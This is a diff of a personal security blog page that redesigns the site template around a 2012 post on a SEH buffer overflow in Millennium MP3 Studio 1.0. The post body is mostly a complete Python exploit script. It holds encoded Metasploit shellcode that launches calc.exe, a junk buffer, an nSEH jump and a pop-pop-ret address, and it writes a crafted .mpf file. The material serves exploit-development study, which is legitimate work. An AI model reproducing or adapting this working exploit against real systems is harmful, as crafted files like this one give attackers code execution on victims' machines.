@@ -1,136 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <title>7h3rAm's Infosec Ramblings</title>
     <meta charset="utf-8"/>
-    <meta content="7h3rAm" name="author"/>
+    <meta name="author" content="7h3rAm"/>
+    <meta name="description" content="Personal Weblog"/>
     <meta content="width=device-width, initial-scale=1" name="viewport"/>
-
-    <script src="/static/js/jquery/jquery-1.10.2.js"></script>
-    <link href="/static/css/bootstrap/bootstrap.3.3.6.min.css" rel="stylesheet" type="text/css">
-    <link href="/static/css/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-    <link href="/static/css/morrisjs/morris.css" rel="stylesheet" type="text/css">
-    <link href="/static/css/timeline/timeline.css" rel="stylesheet" type="text/css">
+    <title>Grey Matter</title>
     <link href="/static/css/main.css" rel="stylesheet" type="text/css">
     <link href="/static/css/codehilite/zenburn.css" rel="stylesheet" type="text/css">
-    <link href="/static/images/favicon.ico" rel="icon" type="image/x-icon"/>
-
-    <!-- Google Analytics -->
-    <script>
-    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-    ga('create', 'UA-50288765-1', '7h3rAm.github.io');
-    ga('send', 'pageview');
-    </script>
-    <script async src='http://www.google-analytics.com/analytics.js'></script>
-    <!-- End Google Analytics -->
-
+    <link href="/static/images/favicon-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
   </head>
-  <body id="index" class="home">
-    <header class="header">
-      <nav>
-        <ul>
-          <li><a href="/"><i class="fa fa-home"></i> Home</a></li>
-          <li><a href="/archive.html"><i class="fa fa-archive"></i> Archive</a></li>
-          <li><a href="/tags.html"><i class="fa fa-tags"></i> Tags</a></li>
-          <li><a href="/dashboard.html"><i class="fa fa-bar-chart"></i> Dashboard</a></li>
-          <li><a href="/research.html"><i class="fa fa-list-alt"></i> Research</a></li>
-        </ul>
-      </nav>
-    </header>
+  <body>
     <section id="content" class="body">
-      
-  
-  
-  <article class="post">
+              <div class="header">
+          <table>
+            <tr>
+              <td class="blogtitle"><a href="/">Grey Matter</a></td>
+              <td class="blognavbar">
+                <a href="/archive.html">[Archive]</a> <a href="/tags.html">[Tags]</a> <a href="/research.html">[Research]</a></a>
+              </td>
+            </tr>
+          </table>
+        </div>
+                  <article class="post">
   <div class="row">
     <div class="col-lg-12">
-      <div class="panel panel-default">
-        <div class="panel-heading post-title">
-          Millennium MP3 Studio .mpf File Parsing SEH Overflow
-        </div>
-        <div class="panel-body">
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-              
-                
-                
-              
-              
-                
-                
-              
-              
-                <p class="post-date">
-                  <a href="/2012/soritong-m3u-seh-overflow.html"><i class="fa fa-angle-double-left"></i></a> published on September 2, 2012<a href="/2012/shadow-stream-recorder-asx-jmpesp.html"> <i class="fa fa-angle-double-right"></i></a><br/>
-                  readtime: 5 minutes and 34 seconds (view <a href="https://raw.githubusercontent.io/7h3rAm/7h3rAm.github.io/master/_posts/millenium-mpf-seh.md">source</a>)
+      <div class="panel panel-default section compact">
+        <div class="body">
+          <p class="heading">Millennium MP3 Studio .mpf File Parsing SEH Overflow</p>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <p class="date">
+                  <a href="/2012/soritong-m3u-seh-overflow.html">&lt&lt;</a> published on 2012 Sep 02<a href="/2012/shadow-stream-recorder-asx-jmpesp.html"> &gt;&gt;</i></a><br/>
                 </p>
-              
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-        <div class="post-summary">Millenium MP3 Studio SEH overflow via a pop-pop-return overwrite.</div>
-        <div class="post-content">
+                                                                                                                                    <div class="post-content">
           <p>The Millennium MP3 Studio version 1.0 is prone to a SEH overflow
 vulnerability. Processing specially-crafted <code>.mpf</code> files could trigger a
 SEH overwrite that could be leveraged further to gain arbitrary code
@@ -139,37 +40,37 @@ execution. The exploit for this vulnerability has been documented at
 
 <p>Here is a complete rewrite of this exploit:</p>
 
-<div class="codehilite"><pre><code><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="nb">file</span> <span class="o">=</span> <span class="s">&quot;edb9298.mpf&quot;</span>
+<span class="nb">file</span> <span class="o">=</span> <span class="s2">&quot;edb9298.mpf&quot;</span>
 
-<span class="c"># msfpayload windows/exec CMD=calc.exe EXITFUNC=seh R | msfencode -b &#39;\x00\x0a\x0d&#39; -t perl</span>
-<span class="c"># [*] x86/shikata_ga_nai succeeded with size 227 (iteration=1)</span>
+<span class="c1"># msfpayload windows/exec CMD=calc.exe EXITFUNC=seh R | msfencode -b &#39;\x00\x0a\x0d&#39; -t perl</span>
+<span class="c1"># [*] x86/shikata_ga_nai succeeded with size 227 (iteration=1)</span>
 
-<span class="n">calc</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;</span><span class="se">\xbb\x34\x46\x73\x3a\xda\xd2\xd9\x74\x24\xf4\x5a\x31\xc9</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\xb1\x33\x31\x5a\x12\x83\xea\xfc\x03\x6e\x48\x91\xcf\x72</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\xbc\xdc\x30\x8a\x3d\xbf\xb9\x6f\x0c\xed\xde\xe4\x3d\x21</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\x94\xa8\xcd\xca\xf8\x58\x45\xbe\xd4\x6f\xee\x75\x03\x5e</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\xef\xbb\x8b\x0c\x33\xdd\x77\x4e\x60\x3d\x49\x81\x75\x3c</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\x8e\xff\x76\x6c\x47\x74\x24\x81\xec\xc8\xf5\xa0\x22\x47</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\x45\xdb\x47\x97\x32\x51\x49\xc7\xeb\xee\x01\xff\x80\xa9</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\xb1\xfe\x45\xaa\x8e\x49\xe1\x19\x64\x48\x23\x50\x85\x7b</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\x0b\x3f\xb8\xb4\x86\x41\xfc\x72\x79\x34\xf6\x81\x04\x4f</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\xcd\xf8\xd2\xda\xd0\x5a\x90\x7d\x31\x5b\x75\x1b\xb2\x57</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\x32\x6f\x9c\x7b\xc5\xbc\x96\x87\x4e\x43\x79\x0e\x14\x60</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\x5d\x4b\xce\x09\xc4\x31\xa1\x36\x16\x9d\x1e\x93\x5c\x0f</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\x4a\xa5\x3e\x45\x8d\x27\x45\x20\x8d\x37\x46\x02\xe6\x06</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\xcd\xcd\x71\x97\x04\xaa\x80\x66\x95\x26\x14\xd1\x4c\x0b</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\x78\xe2\xba\x4f\x85\x61\x4f\x2f\x72\x79\x3a\x2a\x3e\x3d</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\xd6\x46\x2f\xa8\xd8\xf5\x50\xf9\xba\x98\xc2\x61\x13\x3f</span><span class="s">&quot;</span> <span class="o">+</span>
-<span class="s">&quot;</span><span class="se">\x63\x03\x6b</span><span class="s">&quot;</span><span class="p">)</span>
+<span class="n">calc</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\xbb\x34\x46\x73\x3a\xda\xd2\xd9\x74\x24\xf4\x5a\x31\xc9</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\xb1\x33\x31\x5a\x12\x83\xea\xfc\x03\x6e\x48\x91\xcf\x72</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\xbc\xdc\x30\x8a\x3d\xbf\xb9\x6f\x0c\xed\xde\xe4\x3d\x21</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\x94\xa8\xcd\xca\xf8\x58\x45\xbe\xd4\x6f\xee\x75\x03\x5e</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\xef\xbb\x8b\x0c\x33\xdd\x77\x4e\x60\x3d\x49\x81\x75\x3c</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\x8e\xff\x76\x6c\x47\x74\x24\x81\xec\xc8\xf5\xa0\x22\x47</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\x45\xdb\x47\x97\x32\x51\x49\xc7\xeb\xee\x01\xff\x80\xa9</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\xb1\xfe\x45\xaa\x8e\x49\xe1\x19\x64\x48\x23\x50\x85\x7b</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\x0b\x3f\xb8\xb4\x86\x41\xfc\x72\x79\x34\xf6\x81\x04\x4f</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\xcd\xf8\xd2\xda\xd0\x5a\x90\x7d\x31\x5b\x75\x1b\xb2\x57</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\x32\x6f\x9c\x7b\xc5\xbc\x96\x87\x4e\x43\x79\x0e\x14\x60</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\x5d\x4b\xce\x09\xc4\x31\xa1\x36\x16\x9d\x1e\x93\x5c\x0f</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\x4a\xa5\x3e\x45\x8d\x27\x45\x20\x8d\x37\x46\x02\xe6\x06</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\xcd\xcd\x71\x97\x04\xaa\x80\x66\x95\x26\x14\xd1\x4c\x0b</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\x78\xe2\xba\x4f\x85\x61\x4f\x2f\x72\x79\x3a\x2a\x3e\x3d</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\xd6\x46\x2f\xa8\xd8\xf5\x50\xf9\xba\x98\xc2\x61\x13\x3f</span><span class="s2">&quot;</span> <span class="o">+</span>
+<span class="s2">&quot;</span><span class="se">\x63\x03\x6b</span><span class="s2">&quot;</span><span class="p">)</span>
 
-<span class="c"># 50B jump to avoid CSEH and a 4B hole @ 0012F930</span>
-<span class="c"># jumps directly from nseh to nop sled &gt; shellcode</span>
-<span class="n">junk</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">4112</span>
-<span class="n">nseh</span> <span class="o">=</span> <span class="n">pack</span> <span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x909032EB</span><span class="p">)</span><span class="c"># short jump 50B</span>
-<span class="n">cseh</span> <span class="o">=</span> <span class="n">pack</span> <span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x1001FFC7</span><span class="p">)</span><span class="c"># p/p/r 1001FFC7 xaudio.dll</span>
-<span class="n">nops</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">80</span>
+<span class="c1"># 50B jump to avoid CSEH and a 4B hole @ 0012F930</span>
+<span class="c1"># jumps directly from nseh to nop sled &gt; shellcode</span>
+<span class="n">junk</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">4112</span>
+<span class="n">nseh</span> <span class="o">=</span> <span class="n">pack</span> <span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x909032EB</span><span class="p">)</span><span class="c1"># short jump 50B</span>
+<span class="n">cseh</span> <span class="o">=</span> <span class="n">pack</span> <span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x1001FFC7</span><span class="p">)</span><span class="c1"># p/p/r 1001FFC7 xaudio.dll</span>
+<span class="n">nops</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">80</span>
 
 <span class="sd">&#39;&#39;&#39;</span>
 <span class="sd"># 8B jump to avoid CSEH and land in the first NOP sled of 12B</span>
@@ -185,12 +86,12 @@ execution. The exploit for this vulnerability has been documented at
 <span class="n">sploit</span> <span class="o">=</span> <span class="n">junk</span><span class="o">+</span><span class="n">nseh</span><span class="o">+</span><span class="n">cseh</span><span class="o">+</span><span class="n">nops</span><span class="o">+</span><span class="n">calc</span>
 
 <span class="k">try</span><span class="p">:</span>
-<span class="n">handle</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span>
+<span class="n">handle</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
 <span class="n">handle</span><span class="o">.</span><span class="n">write</span> <span class="p">(</span><span class="n">sploit</span><span class="p">)</span>
 <span class="n">handle</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span>
-<span class="k">print</span> <span class="s">&quot;[+] sploit ready: &quot;</span> <span class="o">+</span> <span class="nb">file</span> <span class="o">+</span> <span class="s">&quot; (&quot;</span> <span class="o">+</span> <span class="nb">str</span> <span class="p">(</span><span class="nb">len</span> <span class="p">(</span><span class="n">sploit</span><span class="p">))</span> <span class="o">+</span> <span class="s">&quot;B)&quot;</span>
+<span class="k">print</span> <span class="s2">&quot;[+] sploit ready: &quot;</span> <span class="o">+</span> <span class="nb">file</span> <span class="o">+</span> <span class="s2">&quot; (&quot;</span> <span class="o">+</span> <span class="nb">str</span> <span class="p">(</span><span class="nb">len</span> <span class="p">(</span><span class="n">sploit</span><span class="p">))</span> <span class="o">+</span> <span class="s2">&quot;B)&quot;</span>
 <span class="k">except</span><span class="p">:</span>
-<span class="k">print</span> <span class="s">&quot;[-] exception!&quot;</span>
+<span class="k">print</span> <span class="s2">&quot;[-] exception!&quot;</span>
 
 <span class="sd">&#39;&#39;&#39;</span>
 <span class="sd">/SafeSEH Module Scanner, item 30</span>
@@ -203,144 +104,31 @@ execution. The exploit for this vulnerability has been documented at
 </code></pre></div>
 
         </div>
-        <div class="post-bottomline">
+        <div class="meta">
           <hr/>
-          <p>For comments, questions and suggestions use <a href="https://twitter.com/7h3rAm" target="_blank"><i class="fa fa-twitter"></i></a> or create an <a href="https://github.com/7h3rAm/7h3rAm.github.io/issues/new" target="_blank"><i class="fa fa-exclamation-circle"></i> issue</a> on blog reporsitory.</p>
+          <p>For comments, questions and suggestions use <a href="https://twitter.com/7h3rAm" target="_blank">twitter</a> or create an <a href="https://github.com/7h3rAm/7h3rAm.github.io/issues/new" target="_blank">issue</a> on blog repository.</p>
           <hr/>
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-            
-              
-                
-                
-              
-              
-                
-                
-              
-              <table>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <table>
                 <tr>
-                  <td align="left">(share via <a href="mailto:?subject=Millennium MP3 Studio .mpf File Parsing SEH Overflow&body=/2012/millenium-mpf-seh.html" target="_blank" title="Share via Email"><i class="fa fa-inbox"></i></a> <a href="http://twitter.com/intent/tweet?text=Millennium MP3 Studio .mpf File Parsing SEH Overflow+/2012/millenium-mpf-seh.html&via=7h3rAm" target="_blank" title="Share on Twitter"><i class="fa fa-twitter"></i></a> <a href="http://www.facebook.com/sharer/sharer.php?s=100&p[url]=/2012/millenium-mpf-seh.html&p[images][0]=&p[title]=Millennium MP3 Studio .mpf File Parsing SEH Overflow&p[summary]=Millenium MP3 Studio SEH overflow via a pop-pop-return overwrite." target="_blank" title="Share on Facebook"><i class="fa fa-facebook"></i></a> <a href="https://plus.google.com/share?url=/2012/millenium-mpf-seh.html" target="_blank" title="Share on Google Plus"><i class="fa fa-google-plus"></i></a>)</td>
-                  <td align="right">(tagged <a href=/tags.html#exploit>exploit</a> and <a href=/tags.html#buffer_overflow>buffer_overflow</a>)</td>
+                  <td align="left">(share via <a href="mailto:?subject=Millennium MP3 Studio .mpf File Parsing SEH Overflow&body=http://7h3ram.github.io//2012/millenium-mpf-seh.html" target="_blank" title="Share via Email">mail</a>, <a href="http://twitter.com/intent/tweet?text=Millennium MP3 Studio .mpf File Parsing SEH Overflow+http://7h3ram.github.io//2012/millenium-mpf-seh.html&via=7h3rAm" target="_blank" title="Share on Twitter">twitter</a>, <a href="http://www.facebook.com/sharer/sharer.php?s=100&p[url]=http://7h3ram.github.io//2012/millenium-mpf-seh.html&p[images][0]=&p[title]=Millennium MP3 Studio .mpf File Parsing SEH Overflow&p[summary]=Millenium MP3 Studio SEH overflow via a pop-pop-return overwrite." target="_blank" title="Share on Facebook">facebook</a> or <a href="https://plus.google.com/share?url=http://7h3ram.github.io//2012/millenium-mpf-seh.html" target="_blank" title="Share on Google Plus">google-plus</a>)</td>
+                  <td align="right">(tagged <a href=/tags.html#buffer_overflow>buffer_overflow</a> and <a href=/tags.html#exploit>exploit</a>)</td>
                 </tr>
                 <tr>
-                  
-                    <td align="left"><a href="/2012/soritong-m3u-seh-overflow.html"><i class="fa fa-angle-double-left"></i> SoriTong MP3 Player .m3u File Parsing SEH Overflow <i class="fa fa-angle-double-left"></i></a></td>
-                    <td align="right"><a href="/2012/shadow-stream-recorder-asx-jmpesp.html"><i class="fa fa-angle-double-right"></i> Shadow Stream Recorder .asx File Parsing Buffer Overflow <i class="fa fa-angle-double-right"></i></a></td>
-                  
-                </tr>
+                                      <td align="left"><a href="/2012/soritong-m3u-seh-overflow.html">&lt;&lt; SoriTong MP3 Player .m3u File Parsing SEH Overflow &lt;&lt;</a></td>
+                    <td align="right"><a href="/2012/shadow-stream-recorder-asx-jmpesp.html">&gt;&gt; Shadow Stream Recorder .asx File Parsing Buffer Overflow &gt;&gt;</a></td>
+                                  </tr>
               </table>
-            
-          
-            
-          
-            
-          
-            
-          
-            
-          
-          </div>
+                                                                                                                        </div>
         </div>
       </div>
     </div>
   </div>
-
-  <div class="row">
-    <div class="col-lg-12">
-      <div class="panel panel-default">
-        <div class="panel-heading post-title">
-          Related Posts
-        </div>
-        <div class="panel-body">
-          
-            1. <a href="/2012/tfm-mmplayer-ppl-seh.html">TFM MMPlayer .ppl File Parsing SEH Overflow</a>
-            <div class="overview-date">September 2, 2012</div>
-            <br/>
-          
-            2. <a href="/2014/buf1-challenge.html">buf1 - Another Buffer Overflow Challenge</a>
-            <div class="overview-date">February 24, 2014</div>
-            <br/>
-          
-            3. <a href="/2013/geras-wuos-stack4-solutions.html">Gera's Warming Up on Stack #4 - Solutions</a>
-            <div class="overview-date">January 4, 2013</div>
-            <br/>
-          
-        </div>
-      </div>
-    </div>
-  </div>
-
   </article>
-
-    </section>
-    <footer class="footer">
-      <b><a href="/">Ankur Tyagi</a></b> (<b><a href="https://twitter.com/7h3rAm" target="_blank"><i class="fa fa-at"></i>7h3rAm</a></b>)
-      <br/>
-      Last updated on October 20, 2016 (<b><a href="/rss.xml"><i class="fa fa-rss"></i> rss</a></b> <b><a href="/sitemap.xml"><i class="fa fa-sitemap"></i> sitemap</a></b>)
-      <br/>
-      Published under <b><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank">by-nc-sa</a></b> and powered by <b><a alt="Linux" href="https://www.kernel.org/" target="_blank"><i class="fa fa-linux"></i></a></b>, <b><a alt="Kalpi" href="https://github.com/7h3rAm/kalpi/" target="_blank">kalpi</a></b>, <b><a href="http://git-scm.com/" target="_blank"><i class="fa fa-git"></i></a></b> and <b><a href="https://github.com/7h3rAm/7h3ram.github.io" target="_blank"><i class="fa fa-github"></i></a></b>
-    </footer>
-
-    <script src="/static/js/bootstrap/bootstrap.3.3.6.min.js"></script>
-    <script src="/static/js/raphael/raphael-min.js"></script>
-    <script src="/static/js/morrisjs/morris.min.js"></script>
-    <script src="/static/files/chart-data.js"></script>
-    <script src="/static/js/sprintf/sprintf.js"></script>
-    <script src="/static/js/underscore/underscore-min.js"></script>
-
+              <div class="footer">
+          <center>
+            <a href="/rss.xml" target="_blank">rss</a> | <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank">license</a>
+          </center>
+        </div>
+          </section>
   </body>
 </html>
